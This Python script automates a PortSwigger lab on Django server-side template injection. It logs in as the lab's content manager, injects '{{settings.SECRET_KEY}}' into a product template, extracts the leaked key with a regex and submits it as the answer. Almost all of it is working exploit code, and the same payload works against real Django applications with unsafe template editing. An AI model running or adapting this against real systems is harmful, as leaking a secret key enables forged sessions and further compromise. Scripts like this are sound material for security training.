#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
SSTI with information disclosure via user-supplied objects — Django.

Logs in as content-manager, injects {{settings.SECRET_KEY}} into a product
template, extracts the key from the response, and submits the solution.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_csrf(session: requests.Session, url: str) -> str:
    r = session.get(url)
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not m:
        raise SystemExit("[-] CSRF token not found")
    return m.group(1)


def login(session: requests.Session, lab: str, username: str, password: str) -> None:
    csrf = get_csrf(session, f"{lab}/login")
    r = session.post(f"{lab}/login", data={"csrf": csrf, "username": username, "password": password})
    if "Invalid username" in r.text or r.url.endswith("/login"):
        raise SystemExit("[-] Login failed")
    print(f"[*] Logged in as {username}")


def find_product_id(session: requests.Session, lab: str) -> str:
    r = session.get(f"{lab}/")
    m = re.search(r'productId=(\d+)', r.text)
    if not m:
        raise SystemExit("[-] No product found")
    return m.group(1)


def get_template(session: requests.Session, lab: str, product_id: str) -> tuple[str, str]:
    r = session.get(f"{lab}/product/template?productId={product_id}")
    csrf = re.search(r'name="csrf" value="([^"]+)"', r.text)
    template = re.search(r'<textarea[^>]*>(.*?)</textarea>', r.text, re.DOTALL)
    if not csrf or not template:
        raise SystemExit("[-] Could not extract template or CSRF")
    return csrf.group(1), template.group(1)


def save_template(session: requests.Session, lab: str, product_id: str, csrf: str, body: str) -> str:
    r = session.post(
        f"{lab}/product/template?productId={product_id}",
        data={"csrf": csrf, "template": body, "unlockToken": ""}
    )
    return r.text


def submit_solution(session: requests.Session, lab: str, answer: str) -> None:
    csrf = get_csrf(session, f"{lab}/")
    r = session.post(f"{lab}/submitSolution", data={"answer": answer})
    if "Congratulations" in r.text or r.status_code == 200:
        print("[+] Solution submitted successfully")
    else:
        print(f"[-] Submission status: {r.status_code}")


def main():
    parser = argparse.ArgumentParser(
        description="Solve SSTI Lab 5 (Django info disclosure)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("--username", default="content-manager")
    parser.add_argument("--password", default="C0nt3ntM4n4g3r")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    login(s, lab, args.username, args.password)

    pid = find_product_id(s, lab)
    print(f"[*] Using product ID: {pid}")

    csrf, original = get_template(s, lab, pid)
    injected = original + "\n{{settings.SECRET_KEY}}"
    print("[*] Injecting {{settings.SECRET_KEY}}...")

    response_text = save_template(s, lab, pid, csrf, injected)

    # Extract the secret key — Django secret keys are 50 chars, alphanumeric + symbols
    m = re.search(r'[a-zA-Z0-9!@#$%^&*()_+\-=]{40,}', response_text)
    if not m:
        print("[-] Could not auto-extract key — check the product page manually")
        return

    secret_key = m.group(0)
    print(f"[+] SECRET_KEY: {secret_key}")

    submit_solution(s, lab, secret_key)
    print("[+] Lab solved.")


if __name__ == "__main__":
    main()
